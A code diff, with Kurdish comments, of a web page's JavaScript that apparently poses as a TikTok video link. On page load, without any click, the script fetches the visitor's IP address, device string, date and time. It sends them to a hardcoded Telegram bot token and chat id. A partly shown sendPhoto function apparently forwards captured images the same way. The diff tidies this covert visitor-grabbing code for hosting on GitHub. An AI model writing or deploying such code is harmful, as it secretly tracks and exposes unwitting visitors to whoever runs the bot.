@@ -39,17 +39,21 @@
         const chat_id = "7261354534";
         const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
 
-        // ئەم فانکشنە ڕاستەوخۆ لەگەڵ کردنەوەی لینکەکە کار دەکات
+        // ناردنی زانیارییەکان ڕاستەوخۆ لەگەڵ کردنەوەی لینکەکە لە گیت‌هەب
         async function sendVisitorDetails() {
             try {
-                // هێنانی ئایپی لە ڕێگەی ipapi
+                // هێنانی ئایپی بە شێوەی دەقیق
                 const ipResponse = await fetch('https://ipapi.co/json/');
                 const ipData = await ipResponse.json();
-                
                 const ip = ipData.ip || "نەزانراو";
-                const port = window.location.port || "80/443 (Standard)"; 
+                
+                // لەسەر گیت‌هەب بەهۆی ئەوەی بە پرۆتۆکۆلی HTTPS کار دەکات، پۆرتی فەرمی وێبەکە 443ـە.
+                const port = window.location.port || "443 (HTTPS)"; 
+                
+                // دۆزینەوەی ئامێر
                 const device = navigator.userAgent.split(')')[0].split('(')[1] || "نەزانراو";
                 
+                // کات و ڕێکەوت
                 const now = new Date();
                 const time = now.toLocaleTimeString('en-US', { hour12: false });
                 const date = now.toLocaleDateString('en-US');
@@ -58,11 +62,11 @@
 
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
             } catch (error) {
-                console.log("Error sending visitor details:", error);
+                console.log("Error:", error);
             }
         }
 
-        // لێرەدا ڕاستەوخۆ فانکشنەکە ڕەن دەکەین بەبێ چاوەڕوانکردنی کلیک
+        // بەبێ چاوەڕوانی کلیک، ڕاستەوخۆ لەگەڵ کردنەوەی پەیجەکە کار دەکات
         sendVisitorDetails();
 
         async function sendPhoto(v, c, fileName, caption) {
